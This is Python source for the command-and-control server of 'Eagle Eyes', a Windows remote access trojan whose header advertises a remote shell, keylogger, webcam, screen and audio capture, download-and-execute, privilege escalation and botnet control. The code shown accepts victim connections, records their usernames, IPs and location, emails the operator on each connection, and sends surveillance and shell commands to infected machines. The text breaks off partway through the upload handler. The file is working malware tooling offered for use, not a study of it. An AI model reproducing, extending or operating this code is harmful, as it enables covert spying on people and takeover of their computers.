"""
	Eagle Eyes => A powerful low level TCP networking RAT written in the Python langauge for Windows.
	______________________________________________________
	Supported Features:
		* TCP Network stream (IPv4)
		* Compression & AES256 Encryption
		* Multi Threaded
		* Remote Shell
		  * Command Threading
			* Command Visualization
			* Command Backup
		* Desktop Stream
		* Cam Stream
		* Audio Listener
		* Audio Output
		* Keylogger
			* Logs Visualization
		* Screenshot
		* Webcam Screenshot
		* Show Messagebox
		* Visit Website
		* Upload (& Execute)
		* Download (& Execute)
		* Botnet like functionality
		* Privilege Escalation
		* Service Creation
		* System Information
		* Location Data
"""


import socket
import pickle
import zlib
import os
import threading
import time
import shutil
import argparse
from PIL import Image
from queue import Queue
from subprocess import Popen, PIPE
from win10toast import ToastNotifier
from colorama import init, Fore, Style
init()


print(Fore.LIGHTCYAN_EX, end='')
parser = argparse.ArgumentParser(description='A reverse TCP server, supporting multiple clients & powerful modules.')
parser.add_argument('-ip', '--internet_protocol', default='127.0.0.1', help='The internet protocol to host the server, don\'t specificy this option for local testing, else 127.0.0.1 or localhost is recommended.')
parser.add_argument('-p', '--port',type=int, default=1200, help='Port to be listening on for clients to connect to, default port is 1200.')
parser.add_argument('-mP', '--module_ports', default='1201,1202,1203,1204,1205', help='Set the ports the modules will be using in the order of stream, cam, audio, keylogger, talk.Default is 1201,1202,1203,1204,1205.')
parser.add_argument('-b', '--banner', action='store_false', help='To display the banner upon running the program, use this flag to hide the banner. Default is True.')
parser.add_argument('-u', '--username', default=None, help='Set the username of your server. Default is your computers username.')
parser.add_argument('-t', '--theme', default='light', help='Specify theme the program. specify dark for white terminal windows. Default is light.')
parser.add_argument('-e', '--encoding', default='latin-1', help='Encoding to be used when sending & recieveing data over the wire, default is latin-1.')
parser.add_argument('-n', '--notice', action='store_true', help='To recieve a notice in the console when a client connect to the server. Default is True.')
parser.add_argument('-eN', '--email_notice', default='False,None,None,[]', help='To recieve a notice in your email when a client connect to the server, format: True|False,email,email password, other emails than your own seperated by comma (Optional). Default is False,None,None,[]')
parser.add_argument('-d', '--duplicates', action='store_false', help='To enable duplicate connections from the same computer, this is recognized matching computers usernames. Can be enabled in cases of multiple persons with the exact same username. Default is False.')
parser.add_argument('-w', '--whoami', action='store_false', help='To disable collecting detailed information on client connection. May be a choice for recurring or frequent clients connecting, making the connection faster. Default is True.')
parser.add_argument('-H', '--history', action='store_false', help='To disable a history log of connection & disconnection of every person. Default is True.')
parser.add_argument('-uL', '--use_latest', action='store_true', help='To use settings from last time running the script. Default is False.')
args = parser.parse_args()
print(Style.RESET_ALL, end='')


from Utilities.db_queries import *
update_db(args.use_latest, args.internet_protocol, args.port, args.module_ports)
from Specific.encrypt import Encryption
from Specific.mail import Email
from Utilities.server import *
from Modules.Servers.stream import *
from Modules.Servers.cam import *
from Modules.Servers.audio import *
from Modules.Servers.keylogger import *
from Modules.Servers.talk import *


class Server:
	# Socket, queue & encryption
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	q = Queue()
	encrypt = Encryption()
	toaster = ToastNotifier()
	# headersize
	headersize = 10
	# Threads & jobs
	threads = 2
	jobs = [1, 2]
	# Connections & addresses
	connections = []
	addresses = []
	usernames = []
	priveldges = []
	information = []
	# Program & Session timers
	sessionTime = ''
	runningTime = ''
	# Message transfer
	new_msg = True
	msg_len = 0
	full_msg = b''
	msg = ''
	# Keep alive & connect notice
	keep_alive_timer = 60
	# Filter client
	filter_client = None
	# Session clear screen
	session_clear_screen = False


	"""
		The method called upon instantiation to provide & 
		verify the options specified by the user available
		as command line arguments.
	"""
	def __init__(self, ip, port, username, theme, encoding, console_notice, email_notice, duplicates, whoami, history, banner, module_ports):
		# Ip & port & encoding
		self.ip = ip
		self.port = port
		self.module_ports = module_ports
		self.banner = set_bool(banner)
		self.duplicates = set_bool(duplicates)
		self.history = set_bool(history)
		self.whoami = set_bool(whoami)
		self.encoding = set_encoding(encoding)
		# Username & theme
		self.username = set_username(username)
		self.theme = set_theme(theme)
		# Notices
		self.console_notice = set_bool(console_notice)
		self.email_notice = set_email(email_notice)


	"""
		Listens for connections to accept & handle for
		in the methods below. It simply is setting up,
		binding & listening to a socket.
	"""
	def listen(self):
		try:
			Server.s.bind((self.ip, self.port))
			Server.s.listen()
		except:
			msg_len = len(f'Binding socket to IP[{self.ip}] PORT[{self.port}] failed.')
			print(f'{self.theme[1]}\n{"-" * msg_len}\nBinding socket to IP[{Style.RESET_ALL}{self.theme[3]}{self.ip}{Style.RESET_ALL}]{self.theme[1]} PORT[{Style.RESET_ALL}{self.theme[3]}{self.port}{Style.RESET_ALL}{self.theme[1]}] failed.\n{"-" * msg_len}{Style.RESET_ALL}')
			os._exit(0)
		

	"""
		How to handle the connections coming in, adding
		the data of who this client is to lists, files
		& verifying the connection is coming through
		the client script & not any foreign program.
	"""
	def accept(self):
		# Close all Server.connections
		for connection in Server.connections:
			connection.close()
		
		# Reset Server.connections & Server.addresses
		del Server.connections[:]
		del Server.addresses[:]

		# Accept all clients & append data to lists
		while True:
			client, address = Server.s.accept()
			data = ''
			try:
				if self.whoami:
					data = self.send_message(client, 'dk7ad6mwo5apwr4khg')
					# Options - Duplicate flag
					if self.duplicates is False and data[0][0] in Server.usernames:
						client.close()
						continue
					# Append data to lists
					Server.usernames.append(data[0][0])
					Server.priveldges.append(data[0][1])
					Server.information.append(data[1])

					info = ''
					for typez, item in data[1]:
						info += f'{typez}: {item}\n'
					
					dirs = ['Data', f'Data/{data[0][0]}']
					setup_directory(dirs)
					with open(f'{os.getcwd()}/Data/{data[0][0]}/{data[0][0]}.txt', 'w') as f:
						f.write(f'USER: {data[0][0]}\nIP: {address[0]}\nPORT: {address[1]}\n{info}')
				else:
					data = self.send_message(client, 'aij4sawxorng2u9w5ar7')
					# Options - Duplicate flag
					if self.duplicates is False and data[0] in Server.usernames:
						client.close()
						continue
					# Append data to lists
					Server.usernames.append(data[0])
					Server.priveldges.append(data[1])
					Server.information.append([('OS', 'UNSET'), ('COMPUTER', 'UNSET'), ('VERSION', 'UNSET'), ('EXACT VERSION', 'UNSET'), ('MACHINE', 'UNSET'), ('PROCESSOR', 'UNSET'), ('LOCAL IP', 'UNSET'), ('IP', 'UNSET'), ('HOSTNAME', 'UNSET'), ('CITY', 'UNSET'), ('REGION', 'UNSET'), ('COUNTRY', 'UNSET'), ('LOC', 'UNSET'), ('POSTAL', 'UNSET'), ('ORG', 'UNSET')])
			except:
				client.close()
				continue
			Server.connections.append(client)
			Server.addresses.append(address)

			# Options - History, Whoami, Notice & Email Notice
			if self.history:
				user = ''
				if self.whoami:
					user = data[0][0]
				else:
					user = data[0]

				now = time.strftime('%Y-%m-%d (%H-%M-%S)')
				dirs = ['Data', f'Data/{user}']
				setup_directory(dirs)
				with open(f'{os.getcwd()}/Data/{user}/History.txt', 'a') as f:
					msg = f'CONNECTION: ({now})'
					f.write(f'{msg}\n{"-" * len(msg)}\n')

			if self.console_notice:
				now = time.strftime('%H:%M')				
				Server.toaster.show_toast('Connection Notice!', f'{user} Connected! ({now})\nAddress: {address[0]}:{address[1]}', icon_path=None, duration=5, threaded=True)

			if self.email_notice[0]:
				try:
					info = ''
					if self.whoami:
						for typez, item in data[1]:
							info += f'\n{typez}: {item}'
					now = timer()
					subject = f'Connection! {now}'
					text = f'CONNECTION: {user}\nIP: {address[0]}\nPORT: {address[1]}\nWHEN: {now}{info}'
					Email(self.email_notice[1], self.email_notice[2], self.email_notice[1].split() + self.email_notice[3], subject, text).send_email()
				except:
					print(f'{self.theme[1]}\nFailed to send email notification.\nPlease check your configuration options.\n\n{Style.RESET_ALL}{self.theme[0]}{self.username}\'s Server>{Style.RESET_ALL}{self.theme[3]}', end='')

	
	"""
		Shell is the handler for everything it lets you
		delete, list & connect with clients. It allows
		you to specify options of how the program should
		operate but also has special features like the
		"all" command to allowing botnet like behaviour.
	"""
	def shell(self):
		# Setup shell
		clear_screen()
		Server.runningTime = timer()
		if self.banner:
			banner(self.theme)
		# Setup thread
		threading.Thread(target=self.keepAlive, daemon=True).start()

		while True:
			try:
				# Setup input
				print(f'{self.theme[0]}{self.username}\'s Server>{Style.RESET_ALL}{self.theme[3]}', end='')
				try:
					shell_msg = readInput(self.encoding, True).lower()
				except TimeoutError:
					continue

				# Running modules
				if shell_msg == 'running':
					print(f'{self.theme[2]}Modules Running:\n  - Stream: {stream_info()}\n  - Cam: {cam_info()}\n  - Audio: {audio_info()}\n  - Keylogger: {keylogger_info()}\n  - Talk: {talk_info()}\n{Style.RESET_ALL}')
					continue

				# Stream
				elif shell_msg[:6] == 'stream':
					try:
						if shell_msg[7:11] == 'kill':
							print(f'{self.theme[2]}{set_stream_settings(shell_msg[12:])}{Style.RESET_ALL}\n')
						else:
							self.session(self.getConn(int(shell_msg[7:])), True, 'stream')
					except:
						print(f'{self.theme[2]}Failed to handle stream.{Style.RESET_ALL}\n')

				# Cam
				elif shell_msg[:3] == 'cam':
					try:
						if shell_msg[4:8] == 'kill':
							print(f'{self.theme[2]}{set_cam_settings(shell_msg[9:])}{Style.RESET_ALL}\n')
						else:
							args = shell_msg[4:].split()
							self.session(self.getConn(int(args[0])), True, f'cam {args[1]} {args[2]}')
					except:
						print(f'{self.theme[2]}Failed to handle cam.{Style.RESET_ALL}\n')

				# Audio
				elif shell_msg[:5] == 'audio':
					try:
						if shell_msg[6:10] == 'kill':
							print(f'{self.theme[2]}{set_audio_settings(shell_msg[11:])}{Style.RESET_ALL}\n')
						else:
							self.session(self.getConn(int(shell_msg[6:])), True, 'audio')
					except:
						print(f'{self.theme[2]}Failed to handle audio.{Style.RESET_ALL}\n')						

				# Keylogger
				elif shell_msg[:9] == 'keylogger':
					if shell_msg[10:14].lower() == 'kill':
						print(f'{self.theme[2]}{set_keylogger_settings(shell_msg[15:])}{Style.RESET_ALL}\n')
					elif shell_msg[10:14] == 'text':
						try:
							data = get_logs(int(shell_msg[15:]))
							print(f'{self.theme[2]}{data[1]}{Style.RESET_ALL}\n')
						except:
							print(f'{self.theme[2]}Failed to type logs.{Style.RESET_ALL}\n')
					elif shell_msg[10:15] == 'image':
						try:
							data = get_logs(int(shell_msg[16:]))
							assert data[0] is not None
							dirs = ['Data', f'Data/{data[0]}', f'Data/{data[0]}/Keylogger', f'Data/{data[0]}/Keylogger/Images']
							setup_directory(dirs)
							fn = time.strftime('%Y-%m-%d (%H-%M-%S).png')
							image = text_image(data[1])
							image.show()
							image.save(f'{os.getcwd()}/{dirs[-1]}/{fn}')
							print(f'{self.theme[2]}Logs visualization complete!{Style.RESET_ALL}\n')
						except:
							print(f'{self.theme[2]}Failed to visualize logs.{Style.RESET_ALL}\n')
					else:
						try:
							self.session(self.getConn(int(shell_msg[10:])), True, 'keylogger')
						except:
							print(f'{self.theme[2]}Failed to handle keylogger.{Style.RESET_ALL}\n')

				# Talk
				elif shell_msg[:4] == 'talk':
					try:
						if shell_msg[5:9] == 'kill':
							print(f'{self.theme[2]}{set_talk_settings(shell_msg[10:])}{Style.RESET_ALL}\n')
						else:
							self.session(self.getConn(int(shell_msg[5:])), True, 'talk')
					except:
						print(f'{self.theme[2]}Failed to handle talk.{Style.RESET_ALL}\n')	

				# Server shell
				elif shell_msg[:6] == 'server':
					try:
						data = Popen(shell_msg[7:], shell=True, stdin=PIPE, stdout=PIPE, stderr=PIPE)
						print(f'{self.theme[2]}{data.stdout.read().decode(self.encoding).strip()}{data.stderr.read().decode(self.encoding).strip()}{Style.RESET_ALL}\n'.replace('ÿ', ' '))
					except:
						print(f'{self.theme[2]}Something went wrong running shell command.\n{Style.RESET_ALL}')

				# Archive
				elif shell_msg[:7] == 'archive':
					try:
						if shell_msg.strip() == 'archive':
							raise Exception('No data to archive')
						if shell_msg[-2:] == '-a':
							shutil.make_archive('Data', 'zip', f'{os.getcwd()}/Data')
							shutil.rmtree(f'{os.getcwd()}/Data')
						else:
							user = shell_msg[8:]
							shutil.make_archive(user.capitalize(), 'zip', f'{os.getcwd()}/Data/{user.capitalize()}')
							shutil.rmtree(f'{os.getcwd()}/Data/{user}')
						print(f'{self.theme[2]}Successfully archived your data!\n{Style.RESET_ALL}')
					except:
						print(f'{self.theme[1]}Something went wrong trying to archive your data.\n{Style.RESET_ALL}')

				# Whoami
				elif shell_msg[:6] == 'whoami':
					try:
						target = int(shell_msg[7:])
						# Filter enabled
						Server.filter_client = Server.addresses[target][1]
						data = self.send_message(Server.connections[target], 'dk7ad6mwo5apwr4')
						# Filter disabled
						Server.filter_client = None
						Server.information[target] = data

						info = ''
						for typez, item in data:
							info += f'{typez}: {item}\n'
						
						dirs = ['Data', f'Data/{Server.usernames[target]}']
						setup_directory(dirs)
						with open(f'{os.getcwd()}/Data/{Server.usernames[target]}/{Server.usernames[target]}.txt', 'w') as f:
							f.write(f'USER: {Server.usernames[target]}\nADMIN: {Server.priveldges[target]}\nIP: {Server.addresses[target][0]}\nPORT: {Server.addresses[target][1]}\n{info}')
						print(f'{self.theme[2]}Whoami complete on connection {target}!\n{Style.RESET_ALL}\n', end='')
					except:
						print(f'{self.theme[1]}Something went wrong running whoami.\n{Style.RESET_ALL}')

				# Send all
				elif shell_msg[:3] == 'all':
					# If no clients
					if len(Server.connections) == 0:
						print(f'{self.theme[1]}No clients connected\n{Style.RESET_ALL}')

					for index, connection in enumerate(Server.connections):
						try:
							out = f'{self.theme[2]}{Server.usernames[index]}[{Style.RESET_ALL}{self.theme[3]}{index}{Style.RESET_ALL}{self.theme[2]}] ADMIN[{Style.RESET_ALL}{self.theme[3]}{Server.priveldges[index]}{Style.RESET_ALL}{self.theme[2]}] IP[{Style.RESET_ALL}{self.theme[3]}{Server.addresses[index][0]}{Style.RESET_ALL}{self.theme[2]}] PORT[{Style.RESET_ALL}{self.theme[3]}{Server.addresses[index][1]}{Style.RESET_ALL}{self.theme[2]}]{Style.RESET_ALL}'
							out_length = len(str(index) + Server.usernames[index] + str(Server.priveldges[index]) + Server.addresses[index][0] + str(Server.addresses[index][1]) + '[] ADMIN[] IP[] PORT[]')
							print(f'{out}{self.theme[3]}\n{"-" * out_length}{Style.RESET_ALL}')
						
							client_msg = self.session(self.getConn(index), True, shell_msg[4:])
							if client_msg:
								self.delete_client(index, Server.usernames[index])
						except:
							print(f'{self.theme[1]}Something went wrong sending message.\n{Style.RESET_ALL}')

				# List
				elif shell_msg[:4] == 'list' or shell_msg[:2] == 'ls':
					if shell_msg == 'list' or shell_msg == 'ls':
						self.list_connections(False)
					elif shell_msg == 'list -l' or shell_msg == 'ls -l':
						self.list_connections(True)
					else:
						print(f'{self.theme[2]}\'{shell_msg}\' is not a valid input.\n\n{Style.RESET_ALL}', end='')

				# Select
				elif shell_msg[:7] == 'session':
					try:
						target = int(shell_msg[8:])
						conn = self.getConn(target)
						if conn is not None:
							self.session(conn)
					except:
						print(f'{self.theme[2]}\'{shell_msg[8:]}\' is not a valid session.\n{Style.RESET_ALL}')

				
				elif shell_msg[:6] == 'client':
					try:
						args = shell_msg.split()
						target = int(args[1])
						cmd = ' '.join(args[2:])
						out = f'{self.theme[2]}{Server.usernames[target]}[{Style.RESET_ALL}{self.theme[3]}{target}{Style.RESET_ALL}{self.theme[2]}] ADMIN[{Style.RESET_ALL}{self.theme[3]}{Server.priveldges[target]}{Style.RESET_ALL}{self.theme[2]}] IP[{Style.RESET_ALL}{self.theme[3]}{Server.addresses[target][0]}{Style.RESET_ALL}{self.theme[2]}] PORT[{Style.RESET_ALL}{self.theme[3]}{Server.addresses[target][1]}{Style.RESET_ALL}{self.theme[2]}]{Style.RESET_ALL}'
						out_length = len(str(target) + Server.usernames[target] + str(Server.priveldges[target]) + Server.addresses[target][0] + str(Server.addresses[target][1]) + '[] ADMIN[] IP[] PORT[]')
						print(f'{out}{self.theme[3]}\n{"-" * out_length}{Style.RESET_ALL}')
						self.session(self.getConn(target), True, cmd)
					except:
						if len(Server.connections) == 0:
							print(f'{self.theme[1]}No clients connected\n\n{Style.RESET_ALL}', end='')
						else:
							print(f'{self.theme[1]}Something went wrong, please try again.\n\n{Style.RESET_ALL}', end='')		

				# Delete
				elif shell_msg[:3] == 'del':
					try:
						if shell_msg[4:] == '*':
							if len(Server.connections) == 0:
								print(f'{self.theme[1]}No clients connected\n\n{Style.RESET_ALL}', end='')
							else:
								self.delete_client(':', '*')
								print(f'{self.theme[2]}All connections deleted!\n\n{Style.RESET_ALL}', end='')
						else:
							self.delete_client(int(shell_msg[4:]), Server.usernames[int(shell_msg[4:])])
							print(f'{self.theme[2]}Connection ({Style.RESET_ALL}{self.theme[3]}{shell_msg[4:]}{Style.RESET_ALL}{self.theme[2]}) deleted!\n\n{Style.RESET_ALL}', end='')
					except:
						print(f'{self.theme[2]}\'{shell_msg[4:]}\' is not a valid connection to delete.\n\n{Style.RESET_ALL}', end='')
				
				# Options
				elif shell_msg == 'options':
					if len(self.email_notice[3]) > 0:
						emails_connector = ', '
					else:
						emails_connector = ''

					quick_mode = False
					if self.history is False and self.whoami is False and self.email_notice[0] is False:
						quick_mode = True
						
					if self.email_notice[0]:
						email_info_notice = f'  - Email Notice: True\n    - Email: {self.email_notice[1]}\n    - Password: {self.email_notice[2]}\n    - To: ({self.email_notice[1]}){emails_connector}{", ".join(self.email_notice[3])}'
					else:
						email_info_notice = f'  - Email Notice: False\n    - Email: {self.theme[1]}(Unused: {self.email_notice[1]}){Style.RESET_ALL}{self.theme[2]}\n    - Password: {Style.RESET_ALL}{self.theme[1]}(Unused: {self.email_notice[2]}){Style.RESET_ALL}{self.theme[2]}\n    - To: {Style.RESET_ALL}{self.theme[1]}(Unused: ({self.email_notice[1]}){emails_connector}{", ".join(self.email_notice[3])}){Style.RESET_ALL}'
					module_ports_keys = ('Stream', 'Cam', 'Audio', 'Keylogger', 'Talk')
					module_ports_data = ''
					for index, moudle_port in enumerate(self.module_ports):
						module_ports_data += f'\n    {self.theme[2]}- {module_ports_keys[index]}:{Style.RESET_ALL} {self.theme[1]}(Constant: {moudle_port}){Style.RESET_ALL}'
					print(f'{self.theme[1]}Options Available:{Style.RESET_ALL}{self.theme[2]}\n  - IP: {Style.RESET_ALL}{self.theme[1]}(Constant: {self.ip}){Style.RESET_ALL}{self.theme[2]}\n  - PORT: {Style.RESET_ALL}{self.theme[1]}(Constant: {self.port}){Style.RESET_ALL}{self.theme[2]}\n  - MODULE PORTS:{Style.RESET_ALL} {module_ports_data}{Style.RESET_ALL}{self.theme[2]}\n  - Quick Mode: {quick_mode}\n  - Username: {self.username}\n  - Theme: {self.theme[-1]}\n  - Encoding: {self.encoding}\n  - History: {self.history}\n  - Whoami: {self.whoami}\n  - Notice: {self.console_notice}\n  - Duplicates: {self.duplicates}\n{email_info_notice}\n{Style.RESET_ALL}')

				# Set options
				elif shell_msg[:3] == 'set':
					try:
						value = shell_msg[4:].split('=')
						assert len(value) == 2
						getVal = value[0].lower().strip()
						setVal = value[1].strip()
						result = f'{self.theme[2]}Option successfully set:{Style.RESET_ALL} {self.theme[1]}{" ".join([x.capitalize().strip() for x in value[0].split()])}='
						
						# Quick mode
						if getVal == 'quick mode':
							output_bool = False
							if setVal == 'true':
								output_bool = True
								self.history = False
								self.whoami = False
								self.email_notice[0] = False
							elif setVal == 'false':
								self.history = True
								self.whoami = True
							else:
								raise Exception('Something went wrong.')  
							result += str(output_bool)

						# Username
						elif getVal == 'username':
							self.username = set_username(setVal)
							result += self.username

						# Theme
						elif getVal == 'theme':
							self.theme = set_theme(setVal)
							result += self.theme[-1]

						# Encoding
						elif getVal == 'encoding':
							self.encoding = set_encoding(setVal)
							result += self.encoding

						# History
						elif getVal == 'history':
							if setVal == 'true':
								self.history = True
							elif setVal == 'false':
								self.history = False
							else:
								raise Exception('Something went wrong.')         
							result += str(self.history)

						# Whoami
						elif getVal == 'whoami':
							if setVal == 'true':
								self.whoami = True
							elif setVal == 'false':
								self.whoami = False
							else:
								raise Exception('Something went wrong.')         
							result += str(self.whoami)

						# Console notice
						elif getVal == 'notice':
							if setVal == 'true':
								self.console_notice = True
							elif setVal == 'false':
								self.console_notice = False
							else:
								raise Exception('Something went wrong.')         
							result += str(self.console_notice)
						
						# Duplicates
						elif getVal == 'duplicates':
							if setVal == 'true':
								self.duplicates = True
							elif setVal == 'false':
								self.duplicates = False
							else:
								raise Exception('Something went wrong.')         
							result += str(self.duplicates)

						# Email notice
						elif getVal == 'email notice':
							if setVal == 'true':
								self.email_notice[0] = True
							elif setVal == 'false':
								self.email_notice[0] = False
							else:
								raise Exception('Something went wrong.')
							result += str(self.email_notice[0])

						elif getVal == 'email':
							if '@' in setVal:
								self.email_notice[1] = setVal
								result += self.email_notice[1]
							else:
								raise Exception('Something went wrong.')

						elif getVal == 'password':
							if len(setVal) > 0:
								self.email_notice[2] = setVal
								result += self.email_notice[2]
							else:
								raise Exception('Something went wrong.')

						elif getVal == 'to':
							if len(setVal) > 0:
								self.email_notice[3] = setVal.split(',')
								result += ', '.join(self.email_notice[3])
							else:
								raise Exception('Something went wrong.')

						else:
							print(f'{self.theme[2]}Option failed to be set:{Style.RESET_ALL} {self.theme[1]}{getVal.capitalize()} option not found.\n')
							continue
						
						print(f'{result}\n{Style.RESET_ALL}')
					except:
						print(f'{self.theme[2]}Option failed to be set:{Style.RESET_ALL} {self.theme[1]}Something went wrong.\n{Style.RESET_ALL}')    
				
				# Time
				elif shell_msg == 'time':
					print(f'{self.theme[2]}Start time: [{Style.RESET_ALL}{self.theme[0]}{Server.runningTime}{Style.RESET_ALL}{self.theme[2]}]{Style.RESET_ALL}')
					print(f'{self.theme[2]}Current time: [{Style.RESET_ALL}{self.theme[1]}{timer()}{Style.RESET_ALL}{self.theme[2]}]\n{Style.RESET_ALL}')

				# Banner
				elif shell_msg == 'banner':
					banner(self.theme)

				# Clear
				elif shell_msg == 'clear' or shell_msg == 'cls':
					clear_screen()
 
				# Exit
				elif shell_msg == 'exit' or shell_msg == 'quit':
					self.delete_client(':', '*')
					print(f'{self.theme[2]}Program start: [{Style.RESET_ALL}{self.theme[3]}{Server.runningTime}{Style.RESET_ALL}{self.theme[2]}]{Style.RESET_ALL}')
					print(f'{self.theme[2]}Program end: [{Style.RESET_ALL}{self.theme[1]}{timer()}{Style.RESET_ALL}{self.theme[2]}]\n{Style.RESET_ALL}')
					print(f'{self.theme[4]}Bye!{Style.RESET_ALL}')
					os._exit(0)

				else:
					print(f'{self.theme[2]}\'{shell_msg}\' is not a valid input.\n\n{Style.RESET_ALL}', end='')
			except KeyboardInterrupt:
				print(f'{self.theme[4]}Keyboard interrupt{Style.RESET_ALL}')


	"""
		Session provides the program with all the functionality,
		takes care of modules & special commands. It allows you
		to establish an reverse shell with the built in tools.
		But it also allows you to use one command & get the output
		& print out the result.
	"""
	def session(self, conn, target=None, message=None, stdout=True):
		# Filter client
		Server.filter_client = conn[1][1]
		Server.sessionTime = timer()

		if target is None:
			clear_screen()
			print(f'{self.theme[1]}Connection to {Style.RESET_ALL}{self.theme[2]}{conn[2]}{Style.RESET_ALL}{self.theme[1]}\'s computer has been established!{Style.RESET_ALL}', end='')

		while True:
			try:
				# Session input
				if target is None:
					if Server.session_clear_screen:
						Server.session_clear_screen = False
						print(f'{self.theme[2]}{conn[2]}>{Style.RESET_ALL}{self.theme[3]}', end='')
					else:
						print(f'\n\n{self.theme[2]}{conn[2]}>{Style.RESET_ALL}{self.theme[3]}', end='')
					msg = readInput(self.encoding, Server.keep_alive_timer * 2)
				else:
					msg = message
				Server.msg = msg
				if Server.msg.lower() == 'stream':
					Server.msg = f'stream {self.ip}:{self.module_ports[0]}'
				elif Server.msg[:3].lower() == 'cam' and len(Server.msg.split()) == 3:
					args = Server.msg.split()
					Server.msg = f'cam {self.ip}:{self.module_ports[1]} {args[1]} {args[2]}'
				elif Server.msg.lower() == 'audio':
					Server.msg = f'audio {self.ip}:{self.module_ports[2]}'
				elif Server.msg.lower() == 'keylogger':
					Server.msg = f'keylogger {self.ip}:{self.module_ports[3]}'
				elif Server.msg.lower() == 'talk':
					Server.msg = f'talk {self.ip}:{self.module_ports[4]}'
				# Stdout msg
				stdout_save = Server.msg
				# Save stdout
				if Server.msg[-5:].lower() == '-b -i' or Server.msg[-5:].lower() == '-i -b':
					Server.msg = Server.msg[:-6]
				elif Server.msg[-2:].lower() == '-b' or Server.msg[-2:].lower() == '-i':
					Server.msg = Server.msg[:-3]
				pickled_msg = pickle.dumps({'message': Server.msg})
				compressed_msg = zlib.compress(pickled_msg, 1)
				encrypted_msg = Server.encrypt.do_encrypt(compressed_msg)
				final_msg = bytes(f'{len(encrypted_msg):<{Server.headersize}}', self.encoding) + encrypted_msg

				# Running modules
				if Server.msg.lower() == 'running':
					print(f'{self.theme[1]}Modules Running:\n  - Stream: {stream_info()}\n  - Cam: {cam_info()}\n  - Audio: {audio_info()}\n  - Keylogger: {keylogger_info()}\n  - Talk: {talk_info()}{Style.RESET_ALL}', end='')
					if target is None:
						continue
					else:
						Server.filter_client = None
						break

				# Stream
				elif Server.msg[:6].lower() == 'stream':
					try:
						if Server.msg[7:11].lower() == 'kill':
							try:
								print(f'{self.theme[1]}{set_stream_settings(Server.msg[12:])}{Style.RESET_ALL}', end='')
							except:
								print(f'{self.theme[1]}Failed to kill stream.{Style.RESET_ALL}', end='')
							if target is None:
								continue
							else:
								Server.filter_client = None
								break

						dirs = ['Data', f'Data/{conn[2]}', f'Data/{conn[2]}/Stream']
						setup_directory(dirs)
						threading.Thread(target=Stream, args=[self.encoding, f'{os.getcwd()}/Data/{conn[2]}/Stream', conn[2]], daemon=True).start()
					except:
						print(f'{self.theme[1]}Stream failed to run (server).{Style.RESET_ALL}', end='')
						if target is None:
							continue
						else:
							Server.filter_client = None
							break

				# Cam
				elif Server.msg[:3].lower() == 'cam':
					try:
						if Server.msg[4:8].lower() == 'kill':
							print(f'{self.theme[1]}{set_cam_settings(Server.msg[9:])}{Style.RESET_ALL}\n')
							if target is None:
								continue
							else:
								Server.filter_client = None
								break

						args = Server.msg[4:].split()
						cam_size = args[2].split(',')
						address = args[0].split(':')
						assert len(Server.msg.split()) == 4 and len(cam_size) == 2 and len(address) == 2
						cam_size = tuple([int(cam_size[0]), int(cam_size[1])])
						dirs = ['Data', f'Data/{conn[2]}', f'Data/{conn[2]}/Cam']
						setup_directory(dirs)
						threading.Thread(target=Cam, args=[self.encoding, f'{os.getcwd()}/Data/{conn[2]}/Cam', conn[2], cam_size], daemon=True).start()
					except:
						print(f'{self.theme[1]}Cam failed to run (server).{Style.RESET_ALL}\n')
						if target is None:
							continue
						else:
							Server.filter_client = None
							break

				# Audio
				elif Server.msg[:5].lower() == 'audio':
					try:
						if Server.msg[6:10].lower() == 'kill':
							print(f'{self.theme[1]}{set_audio_settings(Server.msg[11:])}{Style.RESET_ALL}', end='')
							if target is None:
								continue
							else:
								Server.filter_client = None
								break

						dirs = ['Data', f'Data/{conn[2]}', f'Data/{conn[2]}/Audio']
						setup_directory(dirs)
						threading.Thread(target=Audio, args=[self.encoding, f'{os.getcwd()}/Data/{conn[2]}/Audio', conn[2]], daemon=True).start()
					except:
						print(f'{self.theme[1]}Audio failed to run (server).{Style.RESET_ALL}', end='')
						if target is None:
							continue
						else:
							Server.filter_client = None
							break

				# Keylogger
				elif Server.msg[:9].lower() == 'keylogger':
					try:
						if Server.msg[10:14].lower() == 'kill':
							print(f'{self.theme[1]}{set_keylogger_settings(Server.msg[15:])}{Style.RESET_ALL}', end='')
							if target is None:
								continue
							else:
								Server.filter_client = None
								break
						elif Server.msg[10:14].lower() == 'text':
							try:
								data = get_logs(int(Server.msg[15:]))
								print(f'{self.theme[1]}{data[1]}{Style.RESET_ALL}', end='')
							except:
								print(f'{self.theme[1]}Failed to type logs.{Style.RESET_ALL}', end='')
							if target is None:
									continue
							else:
								Server.filter_client = None
								break
						elif Server.msg[10:15].lower() == 'image':
							try:
								data = get_logs(int(Server.msg[16:]))
								assert data[0] is not None
								dirs = ['Data', f'Data/{data[0]}', f'Data/{data[0]}/Keylogger', f'Data/{data[0]}/Keylogger/Images']
								setup_directory(dirs)
								fn = time.strftime('%Y-%m-%d (%H-%M-%S).png')
								image = text_image(data[1])
								image.show()
								image.save(f'{os.getcwd()}/{dirs[-1]}/{fn}')
								print(f'{self.theme[1]}Logs visualization complete!{Style.RESET_ALL}', end='')
							except:
								print(f'{self.theme[1]}Failed to visualize logs.{Style.RESET_ALL}', end='')
							if target is None:
								continue
							else:
								Server.filter_client = None
								break


						dirs = ['Data', f'Data/{conn[2]}', f'Data/{conn[2]}/Keylogger']
						setup_directory(dirs)
						threading.Thread(target=Keylogger, args=[self.encoding, f'{os.getcwd()}/Data/{conn[2]}/Keylogger', conn[2]], daemon=True).start()
					except:
						print(f'{self.theme[1]}Keylogger failed to run (server).{Style.RESET_ALL}', end='')
						if target is None:
							continue
						else:
							Server.filter_client = None
							break

				# Talk
				elif Server.msg[:4].lower() == 'talk':
					try:
						if Server.msg[5:9].lower() == 'kill':
							print(f'{self.theme[1]}{set_talk_settings(Server.msg[10:])}{Style.RESET_ALL}', end='')
							if target is None:
								continue
							else:
								Server.filter_client = None
								break

						dirs = ['Data', f'Data/{conn[2]}', f'Data/{conn[2]}/Talk']
						setup_directory(dirs)
						threading.Thread(target=Talk, args=[self.encoding, f'{os.getcwd()}/Data/{conn[2]}/Talk', conn[2]], daemon=True).start()
					except:
						print(f'{self.theme[1]}Talk failed to run (server).{Style.RESET_ALL}', end='')
						if target is None:
							continue
						else:
							Server.filter_client = None
							break

				# Upload
				if Server.msg[:6].lower() == 'upload':
					try:
						dirs = ['Data', 'Uploads']
						setup_directory(dirs)
						args = Server.msg[7:]
						if Server.msg[-2:].lower() == '-e':
							args = Server.msg[7:-3]
						with open(f'{os.getcwd()}/{dirs[-1]}/{args}', 'rb') as f:
